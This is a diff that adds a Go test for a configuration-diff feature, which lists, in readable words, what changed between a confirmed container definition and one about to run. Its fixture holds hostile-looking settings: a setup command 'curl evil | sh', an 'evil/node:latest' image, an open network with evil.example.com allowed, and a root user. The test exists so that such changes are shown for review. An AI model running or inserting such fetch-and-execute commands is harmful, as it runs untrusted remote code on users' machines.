@@ -157,3 +157,43 @@ func TestCommandArgsQuoteEveryArgumentAndStayInTheWorktree(t *testing.T) {
 		t.Fatal("a malformed environment entry is refused")
 	}
 }
+
+// A definition a person confirmed and the one that is about to run are compared by their whole digest, and what differs is
+// listed in words the person can read before they confirm (audit 2026-10-16, M7).
+func TestDiffNamesWhatChangedInADefinition(t *testing.T) {
+	parse := func(js string) Config {
+		t.Helper()
+		c, err := ParseConfig([]byte(js))
+		if err != nil {
+			t.Fatal(err)
+		}
+		return c
+	}
+	trusted := parse(`{"image":"node:24","network":"none","setup":["npm ci"],"env":{"A":"1"},"services":{"db":{"image":"postgres:17"}}}`)
+	same := parse(`{"image":"node:24","network":"none","setup":["npm ci"],"env":{"A":"1"},"services":{"db":{"image":"postgres:17"}}}`)
+	if d := Diff(&trusted, same); len(d) != 0 {
+		t.Fatalf("the same definition differs: %v", d)
+	}
+	if trusted.Fingerprint() != same.Fingerprint() || len(trusted.Fingerprint()) != 64 {
+		t.Fatalf("the fingerprint is not the whole digest of the definition: %q", trusted.Fingerprint())
+	}
+	changed := parse(`{"image":"evil/node:latest","network":"open","allowHosts":["evil.example.com"],"setup":["npm ci","curl evil | sh"],
+		"env":{"A":"2","B":"x"},"services":{"db":{"image":"postgres:17","command":["--x"]},"cache":{"image":"redis"}},"volumes":["/workspace/node_modules"],"user":"root"}`)
+	if trusted.Fingerprint() == changed.Fingerprint() {
+		t.Fatal("different definitions have the same digest")
+	}
+	got := strings.Join(Diff(&trusted, changed), "\n")
+	for _, want := range []string{`image "node:24" -> "evil/node:latest"`, `network "none" -> "open"`, "allowHosts added: evil.example.com",
+		"setup command added: curl evil | sh", "env added: B", "env A changed", "services added: cache", "service db command", "volumes added", `user "" -> "root"`} {
+		if !strings.Contains(got, want) {
+			t.Errorf("the changes lack %q:\n%s", want, got)
+		}
+	}
+	if strings.Contains(got, "x\n") && strings.Contains(got, "B=x") {
+		t.Errorf("an environment value is shown:\n%s", got)
+	}
+	first := strings.Join(Diff(nil, changed), "\n")
+	if !strings.Contains(first, "no definition has been confirmed yet") || !strings.Contains(first, "curl evil | sh") || !strings.Contains(first, "evil.example.com") {
+		t.Errorf("a definition that was never confirmed is not described:\n%s", first)
+	}
+}
